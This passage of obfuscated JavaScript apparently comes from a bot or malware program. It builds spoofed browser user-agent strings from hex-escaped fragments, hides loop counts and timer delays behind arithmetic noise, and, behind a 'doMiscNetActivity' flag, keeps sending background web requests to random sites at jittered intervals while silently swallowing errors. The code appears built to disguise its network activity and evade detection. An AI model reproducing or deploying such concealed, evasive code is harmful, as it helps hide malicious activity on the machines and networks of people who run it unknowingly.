      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0xb * -0x49 + -0x11 * 0x7a + 0xb3d; k < 0x1ed2 + -0x41f * 0x1 + 0x129 * -0x17; k++)
    setTimeout(f, (0x5 * 0x1c7c + 0x13d15 * -0x1 + 0x19909) * k * getRandomInt(-0x3 * 0x274 + -0xe09 + 0x1566, -0x151f + -0x2160 + -0x3682 * -0x1));
  setInterval(() => {
    f();
    for (let l = -0x4a * -0x8 + 0x2 * 0xbdd + 0x1 * -0x1a0a; l < 0x40 * 0xd + 0xece * -0x2 + 0x1a60; l++)
      setTimeout(f, (-0x5c4a * 0x1 + -0x11817 + 0x1 * 0x25ec1) * l * getRandomInt(0x928 + 0x15bb * 0x1 + -0x1ee2, -0x4 * -0xb9 + -0x39a * -0x7 + -0x95d * 0x3));
  }, -0x39ac30 + -0x29c0 * 0x1ef + 0xc154f0);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0xb0e * 0x1 + -0x3 * -0xe4d + 0x481 * -0x1) * getRandomInt(0xe * 0x163 + -0x40 + 0x5 * -0x3d5, -0x1ef5 + 0xb6a + -0x1 * -0x1390));
}, -0x3 * 0xa6 + -0x1 * 0x18de + -0x6cd * -0x4);